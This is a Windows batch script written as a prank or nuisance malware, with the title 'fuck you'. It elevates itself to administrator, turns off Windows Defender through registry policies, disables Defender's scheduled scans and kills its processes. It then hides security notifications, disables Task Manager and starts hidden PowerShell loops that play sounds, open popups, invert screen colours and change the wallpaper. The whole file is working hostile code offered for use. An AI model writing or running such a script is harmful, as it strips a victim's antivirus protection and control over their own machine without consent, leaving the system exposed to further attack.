@echo off
title fuck you

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

call :DisableDefender
call :DisableNotif
call :DisableTaskMGR
call :PlayMusic
call :OpenRickRoll
call :OpenPopup
call :InvertColors
call :ChangeWallpaper
call :KeyboardListener

exit /b

:DisableDefender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable /f 2>nul
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable /f 2>nul
schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable /f 2>nul
taskkill /IM MsMpEng.exe /F 2>nul
taskkill /IM NisSrv.exe /F 2>nul
goto :eof

:DisableNotif
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f
goto :eof

:DisableTaskMGR
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /IM taskmgr.exe /F 2>nul
goto :eof

:PlayMusic
start "" powershell -WindowStyle Hidden -command "Add-Type -AssemblyName presentationCore; $player = New-Object System.Windows.Media.MediaPlayer; $player.Open([uri]::new((Resolve-Path '%~dp0music1.mp3').Path)); $player.Play(); while($true) { Start-Sleep -Seconds 1 }"
start "" powershell -WindowStyle Hidden -command "Add-Type -AssemblyName presentationCore; while($true) { $delay = Get-Random -Minimum 500 -Maximum 1000; Start-Sleep -Milliseconds $delay; $p = New-Object System.Windows.Media.MediaPlayer; $p.Open([uri]::new((Resolve-Path '%~dp0error1.mp3').Path)); $p.Play() }"
goto :eof

:OpenRickRoll
start https://i.giphy.com/g7GKcSzwQfugw.webp
goto :eof

:OpenPopup
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0popup1.ps1"
goto :eof

:InvertColors
start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);' -Name NativeMethods -Namespace Win32; [Win32.NativeMethods]::SystemParametersInfo(0x1007, 0, [IntPtr]::Zero, 0x01)"
goto :eof

:ChangeWallpaper
set "wallpaper=%~dp0wallpaper.jpg"
start "" powershell -WindowStyle Hidden -Command "reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d '%wallpaper%' /f; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);' -Name NativeMethods -Namespace Win32; [Win32.NativeMethods]::SystemParametersInfo(20, 0, '%wallpaper%', 3)"
goto :eof

:KeyboardListener
start "" powershell -WindowStyle Hidden -NoProfile -Command "
Add-Type -AssemblyName System.Windows.Forms;
\$listener = New-Object System.Windows.Forms.KeyEventArgs([System.Windows.Forms.Keys]::Escape);
\$form = New-Object System.Windows.Forms.Form;
\$form.KeyPreview = \$true;
\$form.Add_KeyDown({
    param(\$sender, \$e)
    if (\$e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
        Start-Process '%~dp0stop.bat';
        [Environment]::Exit(0);
    }
});
\$form.ShowDialog();
"
goto :eof